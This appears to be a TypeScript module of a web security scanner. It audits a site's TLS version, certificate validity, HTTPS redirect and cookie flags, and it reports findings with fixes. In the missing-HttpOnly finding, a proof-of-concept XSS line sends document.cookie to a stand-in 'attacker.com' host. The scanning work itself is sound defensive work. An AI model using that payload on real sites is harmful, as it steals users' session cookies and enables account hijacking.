import type { ScanContext, FindingInput } from "./types.js";
import * as tls from "tls";
import * as https from "https";

interface TLSInfo {
  version: string | null;
  issuer: string | null;
  selfSigned: boolean;
  daysToExpiry: number | null;
  httpRedirectsToHttps: boolean;
}

async function checkTLS(hostname: string, port = 443): Promise<TLSInfo> {
  return new Promise((resolve) => {
    const timeout = setTimeout(() => {
      resolve({ version: null, issuer: null, selfSigned: false, daysToExpiry: null, httpRedirectsToHttps: false });
    }, 8000);

    try {
      const socket = tls.connect({ host: hostname, port, rejectUnauthorized: false, servername: hostname }, () => {
        clearTimeout(timeout);
        const cert = socket.getPeerCertificate();
        const tlsVersion = (socket as any).getProtocol?.() || socket.getProtocol?.() || null;

        let daysToExpiry: number | null = null;
        let issuer: string | null = null;
        let selfSigned = false;

        if (cert && cert.valid_to) {
          const expiryDate = new Date(cert.valid_to);
          daysToExpiry = Math.floor((expiryDate.getTime() - Date.now()) / (1000 * 60 * 60 * 24));
          const issuerObj = cert.issuer?.O || cert.issuer?.CN;
          issuer = Array.isArray(issuerObj) ? issuerObj[0] : (issuerObj || null);
          const subCN = Array.isArray(cert.subject?.CN) ? cert.subject.CN[0] : cert.subject?.CN;
          const issCN = Array.isArray(cert.issuer?.CN) ? cert.issuer.CN[0] : cert.issuer?.CN;
          selfSigned = issCN === subCN || !cert.issuer?.O;
        }

        socket.destroy();
        resolve({ version: tlsVersion, issuer, selfSigned, daysToExpiry, httpRedirectsToHttps: false });
      });

      socket.on("error", () => {
        clearTimeout(timeout);
        resolve({ version: null, issuer: null, selfSigned: false, daysToExpiry: null, httpRedirectsToHttps: false });
      });
    } catch {
      clearTimeout(timeout);
      resolve({ version: null, issuer: null, selfSigned: false, daysToExpiry: null, httpRedirectsToHttps: false });
    }
  });
}

async function checkHttpRedirect(hostname: string): Promise<boolean> {
  return new Promise((resolve) => {
    const timeout = setTimeout(() => resolve(false), 6000);
    try {
      const req = https.get(`http://${hostname}/`, { headers: { "User-Agent": "RedForge-Scanner/2.1" } }, (res) => {
        clearTimeout(timeout);
        const location = res.headers.location || "";
        resolve(res.statusCode !== undefined && res.statusCode >= 300 && res.statusCode < 400 && location.startsWith("https://"));
      });
      req.on("error", () => { clearTimeout(timeout); resolve(false); });
    } catch { clearTimeout(timeout); resolve(false); }
  });
}

interface Cookie {
  name: string;
  raw: string;
  secure: boolean;
  httpOnly: boolean;
  sameSite: string | null;
  maxAge: number | null;
  isAuthCookie: boolean;
}

function parseCookies(cookieHeaders: string[]): Cookie[] {
  const authCookieNames = ["session", "token", "auth", "jwt", "sid", "sessionid", "access_token", "refresh_token", "id_token"];

  return cookieHeaders.map(raw => {
    const parts = raw.split(";").map(s => s.trim());
    const namePart = parts[0] || "";
    const name = namePart.split("=")[0].trim().toLowerCase();
    const lowerRaw = raw.toLowerCase();

    const sameSiteMatch = lowerRaw.match(/samesite=(\w+)/);
    const maxAgeMatch = lowerRaw.match(/max-age=(\d+)/);
    const expiresMatch = lowerRaw.match(/expires=([^;]+)/);

    let maxAge: number | null = null;
    if (maxAgeMatch) {
      maxAge = parseInt(maxAgeMatch[1]);
    } else if (expiresMatch) {
      const expDate = new Date(expiresMatch[1]);
      if (!isNaN(expDate.getTime())) {
        maxAge = Math.floor((expDate.getTime() - Date.now()) / 1000);
      }
    }

    return {
      name,
      raw,
      secure: lowerRaw.includes("; secure") || lowerRaw.includes(";secure"),
      httpOnly: lowerRaw.includes("; httponly") || lowerRaw.includes(";httponly"),
      sameSite: sameSiteMatch ? sameSiteMatch[1].toLowerCase() : null,
      maxAge,
      isAuthCookie: authCookieNames.some(n => name.includes(n)),
    };
  });
}

export async function runTLSCookiesModule(ctx: ScanContext): Promise<FindingInput[]> {
  const findings: FindingInput[] = [];
  const { targetUrl, resHeaders, reachable, addLog } = ctx;

  await addLog("INFO", "[Module 5] SSL/TLS and cookie security analysis...");

  let hostname: string;
  let isHttps = false;
  try {
    const parsed = new URL(targetUrl);
    hostname = parsed.hostname;
    isHttps = parsed.protocol === "https:";
  } catch {
    await addLog("WARN", "[Module 5] Invalid target URL — skipping TLS/cookie analysis");
    return findings;
  }

  // 1. TLS analysis
  if (isHttps) {
    await addLog("DEBUG", `Checking TLS configuration for ${hostname}...`);
    const tlsInfo = await checkTLS(hostname);

    if (tlsInfo.version) {
      const tlsVersion = tlsInfo.version.toUpperCase();
      await addLog("DEBUG", `TLS version: ${tlsVersion}`);

      if (tlsVersion.includes("TLSV1_0") || tlsVersion.includes("TLSV1.0") || tlsVersion === "TLSV1") {
        findings.push({
          title: "Deprecated TLS 1.0 in use (cryptographically broken)",
          description: `The server at ${hostname} supports TLS 1.0, which has been deprecated since 2020 and contains known weaknesses (POODLE, BEAST). PCI DSS v3.2+ mandates TLS 1.2 minimum. Browsers are phasing out support.`,
          endpoint: targetUrl,
          severity: "HIGH",
          cvss: "7.4",
          cwe: "CWE-326",
          owasp: "A02",
          pocCode: `# Verify TLS 1.0 support:\nopenssl s_client -connect ${hostname}:443 -tls1\n# If handshake succeeds, TLS 1.0 is supported`,
          fixExplanation: `Disable TLS 1.0 and 1.1 in your server configuration. For Nginx: ssl_protocols TLSv1.2 TLSv1.3; For Apache: SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1`,
        });
      } else if (tlsVersion.includes("TLSV1_1") || tlsVersion.includes("TLSV1.1")) {
        findings.push({
          title: "Deprecated TLS 1.1 in use",
          description: `The server at ${hostname} supports TLS 1.1, which was deprecated in 2021 (RFC 8996). TLS 1.2+ is required by modern security standards.`,
          endpoint: targetUrl,
          severity: "MEDIUM",
          cvss: "5.4",
          cwe: "CWE-326",
          owasp: "A02",
          fixExplanation: "Disable TLS 1.1. For Nginx: ssl_protocols TLSv1.2 TLSv1.3;",
        });
      } else {
        await addLog("DEBUG", `TLS version acceptable: ${tlsVersion} ✓`);
      }
    }

    if (tlsInfo.daysToExpiry !== null) {
      await addLog("DEBUG", `Certificate expires in ${tlsInfo.daysToExpiry} days`);
      if (tlsInfo.daysToExpiry < 0) {
        findings.push({
          title: "SSL/TLS certificate has EXPIRED",
          description: `The TLS certificate for ${hostname} has already expired (${Math.abs(tlsInfo.daysToExpiry)} days ago). Browsers will show a security warning, users may be unable to connect, and the connection may be vulnerable if certificates are rejected incorrectly.`,
          endpoint: targetUrl,
          severity: "CRITICAL",
          cvss: "9.1",
          cwe: "CWE-298",
          owasp: "A02",
          fixExplanation: "Renew the certificate immediately. Use Let's Encrypt with auto-renewal (certbot --auto-renew) to prevent future expirations. Set up monitoring alerts at 30/14/7 days before expiry.",
        });
      } else if (tlsInfo.daysToExpiry < 30) {
        findings.push({
          title: `SSL/TLS certificate expires in ${tlsInfo.daysToExpiry} days`,
          description: `The TLS certificate for ${hostname} expires in ${tlsInfo.daysToExpiry} days (${new Date(Date.now() + tlsInfo.daysToExpiry * 86400000).toDateString()}). Certificate expiration causes complete HTTPS outage for users.`,
          endpoint: targetUrl,
          severity: "HIGH",
          cvss: "7.4",
          cwe: "CWE-298",
          owasp: "A02",
          fixExplanation: "Renew the certificate now. Enable auto-renewal: certbot renew --dry-run. Set up monitoring: use UptimeRobot or Datadog SSL monitoring to alert at 30 days.",
        });
      }
    }

    if (tlsInfo.selfSigned) {
      await addLog("WARN", `Self-signed certificate detected for ${hostname}`);
      findings.push({
        title: "Self-signed TLS certificate — not trusted by browsers",
        description: `The TLS certificate for ${hostname} appears to be self-signed (issuer CN matches subject CN). Self-signed certificates are not trusted by browsers and show security warnings. They also don't provide protection against man-in-the-middle attacks without certificate pinning.`,
        endpoint: targetUrl,
        severity: "HIGH",
        cvss: "7.4",
        cwe: "CWE-295",
        owasp: "A02",
        fixExplanation: "Replace with a CA-signed certificate. Use Let's Encrypt (free): certbot certonly --webroot -w /var/www -d yourdomain.com. For internal services, set up a private CA (cfssl or step-ca).",
      });
    }

    // Check HTTP → HTTPS redirect
    const httpRedirects = await checkHttpRedirect(hostname);
    if (!httpRedirects) {
      await addLog("WARN", `HTTP port 80 does not redirect to HTTPS for ${hostname}`);
      findings.push({
        title: "HTTP (port 80) does not redirect to HTTPS",
        description: `The HTTP endpoint http://${hostname}/ does not automatically redirect to HTTPS. Users accessing the site via HTTP have their traffic unencrypted. Attackers can perform SSL stripping attacks to downgrade HTTPS connections.`,
        endpoint: `http://${hostname}/`,
        severity: "HIGH",
        cvss: "7.4",
        cwe: "CWE-319",
        owasp: "A02",
        fixPatch: `# Nginx:\nserver {\n    listen 80;\n    server_name ${hostname};\n    return 301 https://$server_name$request_uri;\n}\n\n# Express.js:\napp.use((req, res, next) => {\n  if (!req.secure && process.env.NODE_ENV === 'production') {\n    return res.redirect(301, 'https://' + req.headers.host + req.url);\n  }\n  next();\n});`,
        fixExplanation: "Configure your server to redirect all HTTP traffic to HTTPS with a 301 permanent redirect. Add HSTS to prevent future HTTP connections.",
      });
    } else {
      await addLog("DEBUG", "HTTP → HTTPS redirect active ✓");
    }
  }

  // 2. Cookie analysis
  if (!reachable) {
    await addLog("WARN", "[Module 5] Cookies: target unreachable — skipping");
    return findings;
  }

  const cookieHeaders: string[] = [];
  if (resHeaders["set-cookie"]) {
    if (Array.isArray(resHeaders["set-cookie"])) {
      cookieHeaders.push(...resHeaders["set-cookie"]);
    } else {
      cookieHeaders.push(resHeaders["set-cookie"]);
    }
  }

  // Also collect cookies from auth pages
  const authPaths = ["/api/auth/session", "/auth/login", "/login"];
  for (const path of authPaths.slice(0, 2)) {
    try {
      const authUrl = new URL(path, targetUrl).toString();
      const res = await fetch(authUrl, {
        signal: AbortSignal.timeout(6000),
        headers: { "User-Agent": "RedForge-Scanner/2.1" },
      });
      const sc = res.headers.get("set-cookie");
      if (sc) cookieHeaders.push(sc);
    } catch { /* ignore */ }
  }

  if (cookieHeaders.length === 0) {
    await addLog("DEBUG", "No Set-Cookie headers found in responses");
    return findings;
  }

  const cookies = parseCookies(cookieHeaders);
  await addLog("DEBUG", `Analyzing ${cookies.length} cookie(s) for security flags`);

  for (const cookie of cookies) {
    const extraSeverity = cookie.isAuthCookie ? "HIGH" : "MEDIUM";
    const cookieLabel = `"${cookie.name}"${cookie.isAuthCookie ? " (auth/session cookie)" : ""}`;

    if (!cookie.secure && isHttps) {
      await addLog("WARN", `Cookie ${cookie.name} missing Secure flag`);
      findings.push({
        title: `Cookie ${cookieLabel} missing Secure flag`,
        description: `The cookie "${cookie.name}" is set without the Secure flag. It can be transmitted over unencrypted HTTP connections${cookie.isAuthCookie ? ", exposing session tokens to network eavesdropping" : ""}. Even on HTTPS sites, HTTP subrequests or redirects can leak non-Secure cookies.`,
        endpoint: targetUrl,
        severity: cookie.isAuthCookie ? "HIGH" : "MEDIUM",
        cvss: cookie.isAuthCookie ? "7.4" : "4.3",
        cwe: "CWE-614",
        owasp: "A02",
        fixPatch: `// Express.js:\nres.cookie('${cookie.name}', value, {\n  secure: true,    // ← add this\n  httpOnly: true,\n  sameSite: 'strict'\n});`,
        fixExplanation: `Add the Secure flag to the ${cookie.name} cookie to ensure it is only sent over HTTPS connections.`,
      });
    }

    if (!cookie.httpOnly) {
      await addLog("WARN", `Cookie ${cookie.name} missing HttpOnly flag`);
      findings.push({
        title: `Cookie ${cookieLabel} missing HttpOnly flag (XSS-accessible)`,
        description: `The cookie "${cookie.name}" does not have the HttpOnly flag. JavaScript (including malicious XSS payloads) can read this cookie via document.cookie${cookie.isAuthCookie ? " — an attacker exploiting XSS can steal session tokens and hijack accounts" : ""}.`,
        endpoint: targetUrl,
        severity: extraSeverity as "HIGH" | "MEDIUM",
        cvss: cookie.isAuthCookie ? "7.4" : "4.3",
        cwe: "CWE-1004",
        owasp: "A02",
        pocCode: `// XSS payload to steal cookie:\ndocument.location='https://attacker.com/steal?c='+document.cookie;`,
        fixExplanation: `Add HttpOnly to the ${cookie.name} cookie. HttpOnly prevents JavaScript from accessing the cookie, blocking XSS-based session theft.`,
      });
    }

    if (!cookie.sameSite || cookie.sameSite === "none") {
      await addLog("WARN", `Cookie ${cookie.name} missing or weak SameSite attribute`);
      findings.push({
        title: `Cookie ${cookieLabel} missing SameSite attribute (CSRF risk)`,
        description: `The cookie "${cookie.name}" does not have a SameSite attribute (or is set to None). Without SameSite, the cookie is sent on all cross-origin requests, enabling Cross-Site Request Forgery (CSRF) attacks.`,
        endpoint: targetUrl,
        severity: cookie.isAuthCookie ? "HIGH" : "MEDIUM",
        cvss: cookie.isAuthCookie ? "6.8" : "4.3",
        cwe: "CWE-352",
        owasp: "A01",
        fixPatch: `res.cookie('${cookie.name}', value, { sameSite: 'strict' }); // or 'lax' for OAuth flows`,
        fixExplanation: "Set SameSite=Strict for session cookies to block cross-site submission entirely. Use SameSite=Lax if you need cookies on top-level navigations (OAuth flows). Only use SameSite=None with Secure flag for legitimate cross-site use cases.",
      });
    }

    if (cookie.isAuthCookie && cookie.maxAge !== null && cookie.maxAge > 30 * 24 * 60 * 60) {
      const days = Math.floor(cookie.maxAge / 86400);
      await addLog("WARN", `Auth cookie ${cookie.name} has long expiry: ${days} days`);
      findings.push({
        title: `Authentication cookie "${cookie.name}" persists for ${days} days`,
        description: `The session/auth cookie "${cookie.name}" has a max-age of ${days} days. Long-lived auth cookies increase the window of exposure after a compromise — stolen cookies remain valid for the full duration.`,
        endpoint: targetUrl,
        severity: "MEDIUM",
        cvss: "4.3",
        cwe: "CWE-613",
        owasp: "A07",
        fixExplanation: "Use short-lived access tokens (15 minutes) combined with refresh token rotation. Session cookies should either be session-scoped (no max-age) or limited to 7-14 days with re-authentication required for sensitive actions.",
      });
    }
  }

  await addLog("DEBUG", `[Module 5] TLS/Cookie complete — ${findings.length} issue(s) found`);
  return findings;
}
